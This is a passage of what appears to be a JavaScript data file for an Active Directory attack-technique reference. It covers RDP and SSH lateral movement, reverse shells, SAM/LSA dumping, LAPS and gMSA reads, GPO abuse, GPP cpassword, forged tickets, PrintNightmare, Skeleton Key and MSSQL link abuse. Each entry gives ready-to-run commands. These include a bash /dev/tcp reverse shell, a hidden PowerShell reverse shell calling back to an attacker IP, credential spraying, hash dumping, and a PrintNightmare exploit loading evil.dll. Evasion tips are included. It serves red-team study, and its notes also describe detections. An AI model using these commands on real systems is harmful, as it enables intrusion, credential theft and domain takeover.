    references: [
      { label: 'HackTricks, AtExec', url: 'https://book.hacktricks.wiki/en/windows-hardening/lateral-movement/atexec.html' },
    ],
  },
  {
    id: 'rdp-lateral',
    aliases: ['CanRDP', 'RemoteInteractiveLogonRight'],
    label: 'RDP',
    phase: 'lateral-movement',
    needs: 'creds',
    summary: 'Interactive desktop over RDP (3389).',
    description:
      'Two paths with different prerequisites. Password RDP needs only Remote Desktop Users membership (can be a non-admin), so you may land as a non-admin user. Restricted Admin mode (pass-the-hash over RDP, log in with just an NT hash) additionally requires the account to be a LOCAL ADMIN on the target: a Remote Desktop Users-only account can RDP with a password but cannot use Restricted Admin PtH, so the hash path does not yield a non-admin foothold. Useful to reach GUI-only tooling or ride an existing session.',
    tools: [
      { name: 'xfreerdp (FreeRDP)', url: 'https://github.com/FreeRDP/FreeRDP' },
      { name: 'NetExec (rdp)', url: 'https://github.com/Pennyw0rth/NetExec' },
      { name: 'SharpRDP', url: 'https://github.com/0xthirteen/SharpRDP' },
    ],
    commands: [
      { label: 'Connect with a password (binary may be xfreerdp3 on current distros)', code: r`xfreerdp /v:10.0.0.20 /u:Administrator /p:'Passw0rd!'`, lang: 'bash' },
      { label: 'Pass-the-hash (Restricted Admin)', code: r`xfreerdp /v:10.0.0.20 /u:Administrator /pth:<NTHASH>`, lang: 'bash' },
    ],
    requires: ['Remote Desktop Users membership for password RDP (local admin required for Restricted Admin pass-the-hash)', 'RDP (3389) reachable', 'Restricted Admin mode enabled for pass-the-hash'],
    mitre: mitre('T1021.001'),
    opsec: 'Password-based RDP is a type-10 RemoteInteractive logon (4624) the console user can literally see, plus RDP operational logs. Restricted Admin pass-the-hash instead produces a type-3 Network logon (same as an SMB connection), quieter on the endpoint but exactly what Restricted-Admin-abuse detections hunt for. Bitmap cache is only written client-side for full desktop sessions. Restricted Admin must be enabled host-side for PtH and itself weakens the target.',
    references: [
      { label: 'HackTricks, Pentesting RDP', url: 'https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-rdp.html' },
      { label: 'Portcullis Labs, New Restricted Admin feature of RDP 8.1 allows pass-the-hash', url: 'https://labs.portcullis.co.uk/blog/new-restricted-admin-feature-of-rdp-8-1-allows-pass-the-hash/' },
    ],
  },
  {
    id: 'ssh-lateral',
    label: 'SSH',
    phase: 'lateral-movement',
    needs: 'creds',
    summary: 'Shell over SSH (22): Linux & OpenSSH hosts.',
    description:
      'In mixed estates SSH is a first-class lateral channel: Linux servers, network appliances, hypervisors, and Windows hosts running OpenSSH. Authenticate with reused passwords, recovered private keys, or (on domain-joined Linux) Kerberos/GSSAPI. Any account allowed to log in works; you need not be an admin (escalate locally afterward if not).',
    tools: [
      { name: 'OpenSSH client', url: 'https://www.openssh.org/' },
      { name: 'NetExec (ssh)', url: 'https://github.com/Pennyw0rth/NetExec' },
    ],
    commands: [
      { label: 'Authenticate with a recovered key', code: r`ssh -i id_rsa svc_backup@10.0.0.50`, lang: 'bash' },
      { label: 'Spray reused creds across hosts', code: r`nxc ssh hosts.txt -u users.txt -p passwords.txt --continue-on-success`, lang: 'bash' },
    ],
    requires: ['A valid SSH login on the target: password, private key, or Kerberos', 'SSH (22) reachable'],
    mitre: mitre('T1021.004'),
    opsec: 'Logs to auth.log / sshd (and the Windows OpenSSH operational log). Key-based reuse blends in and often survives password rotations. Hunt for private keys on every host you own.',
    references: [
      { label: 'HackTricks, Pentesting SSH', url: 'https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-ssh.html' },
      { label: 'HighOn.Coffee, SSH Lateral Movement Cheat Sheet', url: 'https://highon.coffee/blog/ssh-lateral-movement-cheat-sheet/' },
    ],
  },
  {
    id: 'reverse-shell',
    label: 'Reverse / Bind Shell',
    phase: 'lateral-movement',
    needs: 'shell',
    summary: 'Turn one-shot exec into an interactive session.',
    description:
      'When the execution primitive is one-shot or non-interactive (a single wmiexec/atexec command, a web shell, MSSQL xp_cmdshell, an Office macro) or inbound ports are firewalled, drop a payload that connects back to your listener for an interactive shell (a bind shell is the ingress-allowed inverse). Pick a one-liner that matches the target runtime: PowerShell, cmd, bash, python, or nc.',
    tools: [
      { name: 'revshells.com', url: 'https://www.revshells.com/' },
      { name: 'msfvenom (Metasploit)', url: 'https://github.com/rapid7/metasploit-framework' },
      { name: 'Ncat', url: 'https://nmap.org/ncat/' },
    ],
    commands: [
      { label: 'Catch the shell (listener)', code: r`nc -lvnp 443`, lang: 'bash' },
      { label: 'Linux bash reverse', code: r`bash -i >& /dev/tcp/10.0.0.66/443 0>&1`, lang: 'bash' },
      { label: 'PowerShell reverse one-liner', code: r`powershell -nop -w hidden -c "$c=New-Object Net.Sockets.TCPClient('10.0.0.66',443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=([Text.Encoding]::ASCII).GetBytes((iex $d 2>&1|Out-String));$s.Write($sb,0,$sb.Length);$s.Flush()}"`, lang: 'powershell' },
      { label: 'Bind shell: target listens (run on the target)', code: r`ncat -lvnp 4444 -e cmd.exe`, lang: 'cmd' },
      { label: 'Bind shell: attacker connects in', code: r`nc 10.0.0.20 4444`, lang: 'bash' },
    ],
    requires: ['Any command-execution primitive on the target', 'An outbound path (reverse) or open inbound port (bind) to your listener'],
    mitre: mitre('T1059'),
    opsec: 'An outbound connection to an attacker IP/port and a shell-spawning parent (w3wp/sqlservr → powershell) are prime EDR signals. Use common ports (443), encrypt where you can, and avoid stock one-liners that signatures already know.',
    references: [
      { label: 'PayloadsAllTheThings, Reverse Shell Cheatsheet', url: 'https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md' },
      { label: 'HackTricks, Windows Reverse Shells', url: 'https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/windows.html' },
    ],
  },
  {
    id: 'user-foothold',
    label: 'User-Context Foothold',
    phase: 'lateral-movement',
    needs: 'domain-user',
    hub: true, // convergence point: every "shell as some user/service account" lands here
    summary: 'Operate as the authenticating user: their privileges, identity, and secrets.',
    description:
      "A shell running as whatever account the access landed you on, carrying exactly ITS privileges, which may or may not be local admin. Most exec channels land you here: WinRM/RDP as a remote-access-group user, a caught reverse shell, web/app RCE as the IIS app-pool or a service account, xp_cmdshell as the SQL service account, a hijacked user's session. Run `whoami /groups` (or `id`) to see what you really hold. The account may be a plain user, a privileged one, or a (often domain) service account. Either way you inherit its identity and group memberships, so move laterally AS it and loot its secrets. If it isn't already local admin, escalate locally (SeImpersonate/potato, etc.) to admin / SYSTEM; if it's a domain account, use its domain identity.",
    tools: [{ name: 'NetExec', url: 'https://github.com/Pennyw0rth/NetExec' }],
    commands: [
      { label: 'Check what this account actually has (Windows; domain UPN may be absent for local/service accounts)', code: r`whoami /groups & whoami /priv & whoami /upn`, lang: 'cmd' },
      { label: 'Check what this account actually has (Linux)', code: r`id; groups; hostname; sudo -l 2>/dev/null`, lang: 'bash' },
    ],
    requires: ['Code execution as a user on the host'],
    mitre: mitre('T1078'),
    opsec: 'Operating as the legitimate user is quiet: their logons and process activity are expected. The tell is a privileged account suddenly running recon, or a burst of escalation attempts from a normal user.',
    references: [
      { label: 'HackTricks, Windows Local Privilege Escalation', url: 'https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html' },
    ],
  },
  {
    id: 'sam-lsa-dump',
    label: 'SAM & LSA Secrets Dump',
    phase: 'credential-access',
    needs: 'local-admin',
    summary: 'Pull local hashes, cached creds, and LSA secrets.',
    description:
      'With SYSTEM/local admin you can dump the local SAM (local account hashes), cached domain credentials (MSCACHE), and LSA secrets (service-account / machine-account passwords): either save the registry hives and parse offline, or read them directly with secretsdump. A reliable credential source that never touches LSASS memory.',
    tools: [
      { name: 'secretsdump (Impacket)', url: 'https://github.com/fortra/impacket' },
      { name: 'NetExec', url: 'https://github.com/Pennyw0rth/NetExec' },
    ],
    commands: [
      { label: 'Save registry hives', code: r`reg save HKLM\SAM sam.save & reg save HKLM\SYSTEM system.save & reg save HKLM\SECURITY security.save`, lang: 'cmd' },
      { label: 'Parse local hives offline', code: r`secretsdump.py -sam sam.save -system system.save -security security.save LOCAL`, lang: 'bash' },
      { label: 'Remote dump with creds', code: r`secretsdump.py domain.local/Administrator:'Passw0rd!'@10.0.0.20`, lang: 'bash' },
    ],
    requires: ['Local admin / SYSTEM on the host (or admin creds for remote)'],
    mitre: mitre('T1003'),
    opsec: 'reg save of SAM/SECURITY and remote secretsdump (creates a service for some methods, 7045) are monitored. LSA secrets often yield a service or machine account, quieter than LSASS dumping.',
    references: [
      { label: 'HackTricks, Stealing Credentials', url: 'https://book.hacktricks.wiki/en/windows-hardening/stealing-credentials/index.html' },
    ],
  },
  {
    id: 'laps-read',
    aliases: ['ReadLAPSPassword'],
    label: 'Read LAPS Password',
    phase: 'credential-access',
    needs: 'domain-user',
    summary: 'Read the LAPS-managed local admin password from AD.',
    description:
      'LAPS stores each host\'s rotated local administrator password in AD: legacy LAPS in the cleartext ms-Mcs-AdmPwd attribute, Windows LAPS (April 2023+) in msLAPS-Password (JSON) or the AES-256 msLAPS-EncryptedPassword. Any principal granted the confidential read right (CONTROL_ACCESS / All-Extended-Rights, surfaced in BloodHound as ReadLAPSPassword) can recover the password and log in as local admin on that host. The encrypted variant adds a second gate: the value is DPAPI-NG-encrypted to a configured principal/group, so ReadLAPSPassword alone returns only the ciphertext blob unless you are also an authorized decryptor (nxc\'s laps module decrypts the DPAPI-NG blob transparently when your context holds that right; pyLAPS only reads the legacy ms-Mcs-AdmPwd attribute).',
    tools: [
      { name: 'NetExec', url: 'https://github.com/Pennyw0rth/NetExec' },
      { name: 'pyLAPS', url: 'https://github.com/p0dalirius/pyLAPS' },
      { name: 'LAPSDumper', url: 'https://github.com/n00py/LAPSDumper' },
    ],
    commands: [
      { label: 'Read/dump LAPS passwords over LDAP (NetExec)', code: r`nxc ldap dc01 -d domain.local -u user -p pass -M laps`, lang: 'bash' },
      { label: 'Authenticate/exec with the LAPS password (NetExec)', code: r`nxc smb 10.0.0.1 -u user -p pass --laps`, lang: 'bash' },
      { label: 'Read with pyLAPS', code: r`pyLAPS.py --action get -d domain.local -u user -p pass --dc-ip 10.0.0.1`, lang: 'bash' },
    ],
    requires: ['A principal with the LAPS read right over the target computer', 'LAPS deployed in the domain'],
    references: [
      { label: 'HackTricks, LAPS', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/laps.html' },
      { label: 'The Hacker Recipes, ReadLAPSPassword', url: 'https://www.thehacker.recipes/ad/movement/dacl/readlapspassword' },
      { label: 'NetExec wiki, Defeating LAPS', url: 'https://www.netexec.wiki/smb-protocol/defeating-laps' },
    ],
    opsec: 'Reading the password attribute is an LDAP query (directory-read; 4662 when SACLs are configured) and does not rotate the password. The recovered password is valid until the next LAPS rotation interval.',
  },
  {
    id: 'gmsa-read',
    aliases: ['ReadGMSAPassword'],
    label: 'Read gMSA Password',
    phase: 'credential-access',
    needs: 'domain-user',
    summary: 'Read msDS-ManagedPassword to derive a gMSA NT hash.',
    description:
      'A Group Managed Service Account\'s password is computed by the KDC and exposed in the msDS-ManagedPassword blob. Principals listed in msDS-GroupMSAMembership (BloodHound: ReadGMSAPassword) can read that blob and derive the account\'s NT hash (and AES keys), then pass-the-hash or overpass-the-hash as the gMSA, which is often a privileged service identity.',
    tools: [
      { name: 'bloodyAD', url: 'https://github.com/CravateRouge/bloodyAD' },
      { name: 'gMSADumper', url: 'https://github.com/micahvandeusen/gMSADumper' },
      { name: 'NetExec', url: 'https://github.com/Pennyw0rth/NetExec' },
    ],
    commands: [
      { label: 'Dump gMSA password/hash', code: r`gMSADumper.py -u user -p pass -d domain.local`, lang: 'bash' },
      { label: 'Read gMSA via NetExec (LDAPS)', code: r`nxc ldap dc01 -d domain.local -u user -p pass --gmsa`, lang: 'bash' },
      { label: 'Grant yourself retrieval rights first (GenericAll)', code: r`bloodyAD -u user -p pass -d domain.local --host dc01 add genericAll '<gMSA$>' '<attacker>'`, lang: 'bash' },
    ],
    requires: ['Membership in the gMSA\'s msDS-GroupMSAMembership (PrincipalsAllowedToRetrieveManagedPassword), or GenericAll to grant it', 'LDAPS reachable (NetExec --gmsa requires it)'],
    versions: ['srv2012', 'srv2016', 'srv2019', 'srv2022', 'srv2025'],
    affects: 'gMSAs require a Server 2012+ DC (the KDS root key and msDS-ManagedPassword arrived in Server 2012).',
    references: [
      { label: 'The Hacker Recipes, ReadGMSAPassword', url: 'https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword' },
      { label: 'NetExec wiki, Dump gMSA', url: 'https://www.netexec.wiki/ldap-protocol/dump-gmsa' },
    ],
    opsec: 'The managed-password read is an LDAP query; Windows refuses to return the blob over cleartext LDAP, so retrieval typically forces LDAPS. The derived hash stays valid until the gMSA rotates (default 30 days).',
  },
  {
    id: 'gpo-abuse',
    label: 'GPO Abuse',
    phase: 'priv-esc',
    needs: 'domain-user',
    summary: 'Edit a writable GPO -> immediate task / local admin on linked hosts.',
    description:
      'With edit rights (GenericWrite/WriteDacl/WriteProperty, BloodHound: GenericWrite over a GPO) you can modify a Group Policy Object\'s files in SYSVOL. Inject an immediate scheduled task or add a local administrator; the change applies as SYSTEM (computer policy) to every computer the GPO is linked to (potentially an OU full of servers or even Domain Controllers), turning one ACL into domain-wide code execution. Clients only re-apply when the GPO version increments (gPCVersionNumber in AD plus the GPT.INI version in SYSVOL), so a raw file edit alone can be ignored as unchanged. SharpGPOAbuse / pyGPOAbuse bump the version and write the extension GUIDs for you, which is why you use them rather than hand-editing SYSVOL.',
    tools: [
      { name: 'SharpGPOAbuse', url: 'https://github.com/ReversecLabs/SharpGPOAbuse' },
      { name: 'pyGPOAbuse', url: 'https://github.com/Hackndo/pyGPOAbuse' },
    ],
    commands: [
      { label: 'Add a local admin (SharpGPOAbuse)', code: r`SharpGPOAbuse.exe --AddLocalAdmin --UserAccount attacker --GPOName "Vulnerable GPO"`, lang: 'powershell' },
      { label: 'Immediate computer task (SharpGPOAbuse)', code: r`SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author DOMAIN\Admin --Command "cmd.exe" --Arguments "/c net user ..." --GPOName "Vulnerable GPO"`, lang: 'powershell' },
      { label: 'Add local admin from Linux (pyGPOAbuse)', code: r`pygpoabuse.py domain.local/user -hashes :<NTHASH> -gpo-id <GPO-GUID>`, lang: 'bash' },
    ],
    requires: ['Edit rights (GenericWrite/WriteDacl/WriteProperty) over a GPO', 'The GPO linked to a useful OU/computer'],
    mitre: mitre('T1484.001'),
    references: [
      { label: 'HackTricks, Abusing AD ACLs/ACEs', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/acl-persistence-abuse/index.html' },
      { label: 'SpecterOps, A Red Teamer\'s Guide to GPOs and OUs', url: 'https://specterops.io/blog/2018/02/26/a-red-teamers-guide-to-gpos-and-ous/' },{ label: 'The Hacker Recipes, Group policies', url: 'https://www.thehacker.recipes/ad/movement/group-policies' }],
    opsec: 'Writing to SYSVOL changes gPCMachineExtensionNames and the policy files (5136 / file-share auditing). The change is inert until the client\'s next Group Policy refresh (default ~90 min + random offset) or a forced gpupdate applies it; the client-side telemetry is then policy processing, followed by an unexpected immediate/scheduled task registration and its child process. Remove the task and revert the GPO after use.',
  },
  {
    id: 'gpp-cpassword',
    label: 'GPP cPassword (MS14-025)',
    phase: 'credential-access',
    needs: 'domain-user',
    summary: 'Decrypt cpassword from SYSVOL Groups.xml to cleartext.',
    description:
      'Group Policy Preferences could push credentials (e.g. a local admin set via Groups.xml, or scheduled-task/service/mapped-drive creds). The password is stored in a cpassword attribute encrypted with a 32-byte AES key Microsoft published in MSDN, so any authenticated domain user who can read SYSVOL can decrypt it to cleartext. MS14-025 stopped new GPP credentials but left existing XML in place.',
    tools: [
      { name: 'Get-GPPPassword (PowerSploit)', url: 'https://github.com/PowerShellMafia/PowerSploit' },
      { name: 'gpp-decrypt', url: 'https://github.com/t0thkr1s/gpp-decrypt' },
      { name: 'NetExec', url: 'https://github.com/Pennyw0rth/NetExec' },
    ],
    commands: [
      { label: 'Find & decrypt GPP creds (NetExec)', code: r`nxc smb 10.0.0.1 -u user -p pass -M gpp_password`, lang: 'bash' },
      { label: 'Hunt GPP passwords (PowerSploit)', code: r`Get-GPPPassword`, lang: 'powershell' },
      { label: 'Decrypt a known cpassword', code: r`gpp-decrypt -c <cpassword>`, lang: 'bash' },
    ],
    requires: ['Read access to SYSVOL (any authenticated domain user)', 'A legacy GPP XML still containing cpassword'],
    mitre: mitre('T1552.006'),
    references: [{ label: 'MITRE ATT&CK T1552.006', url: 'https://attack.mitre.org/techniques/T1552/006/' }, { label: 'Microsoft, MS14-025 bulletin (CVE-2014-1812)', url: 'https://learn.microsoft.com/en-us/security-updates/securitybulletins/2014/ms14-025' }],
    opsec: 'SYSVOL reads are normal domain traffic and decryption is fully offline, so this is very low-signal. Modern, well-patched domains have usually purged GPP cpassword files.',
  },
  {
    id: 'trust-sid-history',
    aliases: ['SpoofSIDHistory', 'ExtraSids'],
    label: 'Trust / SID History (Child -> Forest)',
    phase: 'domain-dominance',
    needs: 'domain-admin',
    summary: 'Forge a ticket with the Enterprise Admins SID via sidHistory.',
    description:
      'Within a single forest there is no SID filtering on intra-forest trusts, so the sidHistory / ExtraSids field of a ticket is honored across the trust. With the child domain\'s krbtgt key, forge an inter-realm or golden ticket whose ExtraSids contains the root domain\'s Enterprise Admins SID (<root-SID>-519); the parent KDC treats you as an Enterprise Admin, escalating from child Domain Admin to full forest compromise. Operationally you use the forged golden TGT against the child DC, then request a service ticket to a parent-domain resource; the child KDC returns an inter-realm referral whose PAC still carries the -519 ExtraSid, which the parent honours. You do not hand the child-krbtgt ticket to the parent DC directly, since it cannot decrypt it (raiseChild automates the chain).',
    tools: [
      { name: 'ticketer (Impacket)', url: 'https://github.com/fortra/impacket' },
      { name: 'raiseChild (Impacket)', url: 'https://github.com/fortra/impacket' },
      { name: 'Mimikatz', url: 'https://github.com/gentilkiwi/mimikatz' },
    ],
    commands: [
      { label: 'Forge ticket with EA ExtraSid', code: r`ticketer.py -nthash <CHILD_KRBTGT> -domain-sid <CHILD_SID> -domain child.domain.local -extra-sid <ROOT_SID>-519 Administrator`, lang: 'bash' },
      { label: 'Automate child -> parent', code: r`raiseChild.py child.domain.local/childadmin:pass`, lang: 'bash' },
    ],
    requires: ['Domain Admin / krbtgt key of the child domain', 'A child domain within the target forest'],
    mitre: mitre('T1134.005'),
    references: [
      { label: 'harmj0y, A Guide to Attacking Domain Trusts', url: 'https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/' },{ label: 'HackTricks, SID-History Injection', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/sid-history-injection.html' }],
    opsec: 'A forged golden TGT containing a high-privilege ExtraSid is detectable by the same anomalies as golden tickets (no preceding AS-REQ, odd lifetime/etype). SID filtering / quarantine is NOT a valid defense here: a single forest is one security boundary, and quarantine/SID filtering apply only to external/forest (cross-forest) trusts, not to intra-forest parent-child trusts. The real mitigations are guarding and rotating the child krbtgt, isolating untrusted domains into separate forests, and detecting golden-ticket anomalies.',
  },
  {
    id: 'printnightmare',
    label: 'PrintNightmare (CVE-2021-34527)',
    phase: 'priv-esc',
    needs: 'domain-user',
    summary: 'Print Spooler driver load -> code execution as SYSTEM.',
    description:
      'A flaw in the Print Spooler (RpcAddPrinterDriverEx / AddPrinterDriver) lets an authenticated user supply a malicious driver DLL that the spooler loads as SYSTEM. CVE-2021-1675 is the local LPE; CVE-2021-34527 extends it to remote code execution against any host (including a DC) running the Spooler. Drop a DLL on a share, point the spooler at it, and you execute as SYSTEM.',
    tools: [
      { name: 'CVE-2021-1675 (cube0x0)', url: 'https://github.com/cube0x0/CVE-2021-1675' },
      { name: 'Invoke-Nightmare (calebstewart)', url: 'https://github.com/calebstewart/CVE-2021-1675' },
      { name: 'NetExec (printnightmare)', url: 'https://github.com/Pennyw0rth/NetExec' },
    ],
    commands: [
      { label: 'Remote exploit via a DLL share', code: r`CVE-2021-1675.py domain.local/user:pass@10.0.0.10 '\\10.0.0.50\share\evil.dll'`, lang: 'bash' },
      { label: 'Local LPE (add local admin)', code: r`Invoke-Nightmare -NewUser hacker -NewPassword 'Passw0rd!'`, lang: 'powershell' },
      { label: 'Check spooler + vulnerability (NetExec)', code: r`nxc smb <host> -u user -p pass -M printnightmare`, lang: 'bash' },
    ],
    requires: ['The Print Spooler service running on the target', 'A valid domain account (remote) or local user (LPE)', "cube0x0's forked Impacket (github.com/cube0x0/impacket) for CVE-2021-1675.py, not stock Impacket", 'Host missing the August-2021 updates / without RestrictDriverInstallationToAdministrators enforced (the initial July OOB fix was bypassable)'],
    affects: 'Print Spooler on Windows 7 / Server 2008 R2 through Windows 11 / Server 2022 (client and server editions), before the July-2021 out-of-band update.',
    mitre: mitre('T1068'),
    opsec: 'Spooler driver loads and the new DLL under the spool drivers path are detectable (RpcAddPrinterDriverEx, 808/4688 events). Disabling the Print Spooler where it is not needed fully mitigates it.',
    references: [
      { label: 'HackTricks, PrintNightmare', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/printnightmare.html' },
      { label: 'Microsoft MSRC, CVE-2021-34527 advisory (Print Spooler RCE)', url: 'https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527' },
    ],
  },
  {
    id: 'skeleton-key',
    label: 'Skeleton Key',
    phase: 'persistence',
    needs: 'domain-admin',
    summary: 'Patch LSASS on a DC -> master password for every account.',
    description:
      'mimikatz misc::skeleton patches LSASS on a Domain Controller so that, alongside each account\'s real password, a single master password ("mimikatz" by default) authenticates as any domain user. It patches the NTLM and Kerberos-RC4 validation paths, so it does not work against smart-card / AES-only accounts, and in a multi-DC site every DC in the site must be patched for the master password to be reliable. It is an in-memory patch: it survives until the DC reboots and downgrades affected auth to RC4_HMAC, so it is fast but volatile persistence.',
    tools: [{ name: 'Mimikatz', url: 'https://github.com/gentilkiwi/mimikatz' }],
    commands: [
      { label: 'Inject the skeleton key on a DC', code: r`privilege::debug` + '\n' + r`misc::skeleton`, lang: 'text' },
      { label: 'Authenticate with the master password', code: r`net use \\dc01\admin$ /user:domain\anyuser mimikatz`, lang: 'cmd' },
    ],
    requires: ['Domain Admin / SYSTEM on a Domain Controller', 'Code execution on the DC to run mimikatz'],
    mitre: mitre('T1556.001'),
    references: [
      {
        label: 'Secureworks CTU, Skeleton Key Malware Analysis (original discovery)',
        url: 'https://www.secureworks.com/research/skeleton-key-malware-analysis',
      },
      { label: 'The Hacker Recipes, Skeleton key', url: 'https://www.thehacker.recipes/ad/persistence/skeleton-key/' },
    ],
    opsec: 'Patching LSASS on a DC is high-signal and lost on reboot; the forced RC4 downgrade is itself anomalous. RunAsPPL forces the attacker to load a kernel driver (mimikatz mimidrv.sys, !+) to strip LSASS protection before patching, generating additional driver-load telemetry rather than preventing the attack. Credential Guard / VBS-isolated LSASS is a stronger control.',
  },
  {
    id: 'diamond-ticket',
    label: 'Diamond Ticket',
    phase: 'domain-dominance',
    needs: 'domain-admin',
    summary: 'Modify a real KDC-issued TGT with the krbtgt key.',
    description:
      'Rather than forging a TGT from scratch (golden ticket), a diamond ticket requests a legitimate TGT from the DC, decrypts it with the krbtgt key (AES256 preferred), edits the PAC (e.g. add Domain Admins), then re-encrypts and re-signs it. Because a genuine AS-REQ precedes its use, it evades golden-ticket detections that flag a TGS with no preceding AS exchange.',
    tools: [
      { name: 'Rubeus', url: 'https://github.com/GhostPack/Rubeus' },
      { name: 'ticketer (Impacket)', url: 'https://github.com/fortra/impacket' },
    ],
    commands: [
      { label: 'Craft a diamond TGT (Rubeus)', code: r`Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /krbkey:<KRBTGT_AES256> /nowrap`, lang: 'powershell' },
      { label: 'Request + modify with ticketer', code: r`ticketer.py -request -domain domain.local -user user -password pass -aesKey <KRBTGT_AES256> -domain-sid <SID> -user-id 500 -groups 512 Administrator`, lang: 'bash' },
    ],
    requires: ['The krbtgt AES256 key (or NT hash)', 'A valid set of domain credentials to request the base TGT'],
    mitre: mitre('T1558'),
    references: [
      { label: 'HackTricks, Diamond Ticket', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/diamond-ticket.html' },{ label: 'TrustedSec (Andrew Schwartz & Charlie Clark), A Diamond in the Ruff', url: 'https://trustedsec.com/blog/a-diamond-in-the-ruff' },{ label: 'The Hacker Recipes, Diamond tickets', url: 'https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/diamond' }],
    opsec: 'Stealthier than a golden ticket because a real AS-REQ precedes the TGS; use /opsec (Rubeus) to mimic a Windows AS-REQ and stick to AES256. PAC values that diverge from the account\'s real group memberships can still be caught by behavioral detection / log correlation (an unexpected privileged group in the PAC versus the account\'s real membership); a correctly re-signed diamond ticket still passes signature-only PAC validation.',
  },
  {
    id: 'pass-the-certificate',
    label: 'Pass-the-Certificate',
    phase: 'credential-access',
    needs: 'domain-user',
    summary: 'PKINIT with a client-auth cert -> TGT, then UnPAC the NT hash.',
    description:
      'A certificate with the Client Authentication EKU (from ADCS abuse, shadow credentials, or a stolen PFX) can pre-authenticate via PKINIT to obtain a Kerberos TGT for that principal. UnPAC-the-hash then recovers the account\'s NT hash from the PAC (using the AS-REP key), giving you both a usable ticket and a reusable hash without ever knowing the password.',
    tools: [
      { name: 'Certipy', url: 'https://github.com/ly4k/Certipy' },
      { name: 'PKINITtools', url: 'https://github.com/dirkjanm/PKINITtools' },
    ],
    commands: [
      { label: 'Auth with a PFX -> TGT + NT hash (Certipy)', code: r`certipy auth -pfx user.pfx -dc-ip 10.0.0.1`, lang: 'bash' },
      { label: 'Get a TGT via PKINIT (PKINITtools)', code: r`gettgtpkinit.py domain.local/user -cert-pfx user.pfx user.ccache`, lang: 'bash' },
      { label: 'UnPAC the NT hash from the AS-REP key', code: r`getnthash.py domain.local/user -key <AS_REP_KEY>`, lang: 'bash' },
    ],
    requires: ['A certificate (PFX) with Client Authentication EKU for the target', 'A PKINIT-capable KDC (AD CS / KDC cert)'],
    mitre: mitre('T1649'),
    references: [
      { label: 'HackTricks, AD CS Account Persistence', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/account-persistence.html' },
      { label: 'Certipy wiki, Authentication (Pass the Certificate / PKINIT)', url: 'https://github.com/ly4k/Certipy/wiki/07-%E2%80%90-Authentication' },
      { label: 'The Hacker Recipes, UnPAC the hash', url: 'https://www.thehacker.recipes/ad/movement/kerberos/unpac-the-hash' },
      { label: 'dirkjanm, PKINITtools (getnthash.py)', url: 'https://github.com/dirkjanm/PKINITtools' },
    ],
    opsec: 'PKINIT logons are auditable (4768 with certificate info) and certificates outlive password resets, making them durable. Certipy auth performs UnPAC-the-hash automatically after obtaining the TGT.',
  },
  {
    id: 'mssql-linked-servers',
    label: 'MSSQL Linked Servers',
    phase: 'lateral-movement',
    needs: 'creds',
    summary: 'Pivot through trusted MSSQL links -> xp_cmdshell.',
    description:
      'MSSQL linked servers let one instance query another, often executing on the remote side under a higher-privileged mapped login. By chaining EXECUTE AT / OPENQUERY across links you can crawl from a low-priv login to a sysadmin context on another SQL host, then enable and run xp_cmdshell to get OS command execution as the (frequently privileged) SQL service account.',
    tools: [
      { name: 'mssqlclient (Impacket)', url: 'https://github.com/fortra/impacket' },
      { name: 'PowerUpSQL', url: 'https://github.com/NetSPI/PowerUpSQL' },
      { name: 'NetExec (enum_links)', url: 'https://github.com/Pennyw0rth/NetExec' },
    ],
    commands: [
      { label: 'Connect (Windows auth)', code: r`mssqlclient.py -windows-auth domain.local/user:pass@10.0.0.30`, lang: 'bash' },
      { label: 'Enumerate links, hop, exec', code: r`enum_links` + '\n' + r`use_link LINKED-SQL` + '\n' + r`enable_xp_cmdshell` + '\n' + r`xp_cmdshell whoami`, lang: 'sql' },
      { label: 'Crawl all links (PowerUpSQL)', code: r`Get-SQLServerLinkCrawl -Instance sql01 -Query "exec master..xp_cmdshell 'whoami'"`, lang: 'powershell' },
      { label: 'Enumerate linked servers (NetExec)', code: r`nxc mssql <host> -u user -p pass -M enum_links`, lang: 'bash' },
      { label: 'OS command on a linked server (NetExec)', code: r`nxc mssql <host> -u user -p pass -M link_xpcmd -o LINKED_SERVER=SQL02 CMD='whoami'`, lang: 'bash' },
    ],
    requires: ['A valid MSSQL login (Windows or SQL auth)', 'One or more linked servers with usable login mappings'],
    mitre: mitre('T1059.003'),
    references: [{ label: 'HackTricks, Abusing AD MSSQL', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/abusing-ad-mssql.html' }, { label: 'NetSPI (Antti Rantasaari), How to Hack Database Links in SQL Server', url: 'https://www.netspi.com/blog/technical-blog/network-pentesting/how-to-hack-database-links-in-sql-server/' }, { label: 'NetSPI (Antti Rantasaari), SQL Server Link Crawling with PowerUpSQL (Get-SQLServerLinkCrawl)', url: 'https://www.netspi.com/blog/technical-blog/network-penetration-testing/sql-server-link-crawling-powerupsql/' }],
    opsec: 'xp_cmdshell spawns processes under the SQL Server service account (4688; the command line is captured only where process-creation command-line auditing is enabled, off in many environments) and is disabled by default. The more decisive enable-step signal is SQL Application-log Event ID 15457 (config option changed) / the SQL error log. Linked-server hops appear as distributed queries in SQL audit/trace.',
  },
  {
    id: 'adcs-esc4',
    aliases: ['ADCSESC4'],
    label: 'ADCS ESC4 (Template ACL)',
    phase: 'priv-esc',
    needs: 'domain-user',
    summary: 'Write a cert template into an ESC1-vulnerable state, then enroll.',
    description:
